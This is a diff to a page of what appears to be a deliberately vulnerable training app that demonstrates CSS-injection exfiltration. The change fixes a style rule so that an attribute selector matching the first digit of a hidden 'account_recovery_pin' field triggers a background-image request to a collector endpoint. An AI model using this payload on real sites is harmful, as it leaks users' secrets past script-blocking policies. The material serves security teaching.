@@ -11,10 +11,18 @@
   which is exactly what makes it dangerous behind a Content-Security-Policy
   that blocks JavaScript but has no equivalent restriction on CSS.
 </p>
+<p class="text-muted">
+  Note the rule below targets <code>+ p</code> -- the rendered paragraph
+  immediately after the hidden PIN field -- rather than the hidden input
+  itself. Hidden inputs are <code>display:none</code>, and a browser never
+  fetches <code>background-image</code> for an element that isn't rendered,
+  so a selector matching the hidden input directly would never fire; hopping
+  to the next rendered sibling is what actually triggers the request.
+</p>
 <iframe sandbox="" style="border:1px solid #ccc; width:100%; height:120px"
   src="data:text/html,
   &lt;style&gt;
-    input[name=&quot;account_recovery_pin&quot;][value^=&quot;7&quot;] {
+    input[name=&quot;account_recovery_pin&quot;][value^=&quot;7&quot;] + p {
       background-image: url(&quot;{{ url_for('a03_injection.css_exfil_collector', leak='7', _external=True) }}&quot;);
     }
   &lt;/style&gt;
